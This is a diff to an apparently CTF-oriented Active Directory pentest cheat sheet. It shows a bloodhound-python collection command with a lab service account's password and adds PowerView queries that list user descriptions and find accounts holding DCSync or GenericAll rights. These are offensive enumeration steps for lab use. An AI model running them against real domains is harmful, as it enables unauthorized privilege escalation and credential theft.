@@ -37,6 +37,15 @@ Bloodhound-Python
 ```bash
 bloodhound-python -d sequel.htb -u sql_svc -p 'WqSZAF6CysDQbGb3' -dc dc01.sequel.htb -gc dc01.sequel.htb -ns 10.10.11.51 -c all
 ```
+PowerView/Sharpview
+```powershell
+#Get all users without a blank description field
+Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
+
+#Get all all users with DCSync
+$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
+Convert-SidToName $dcsync
+```
 ### Password Spray
 CME
 ```bash
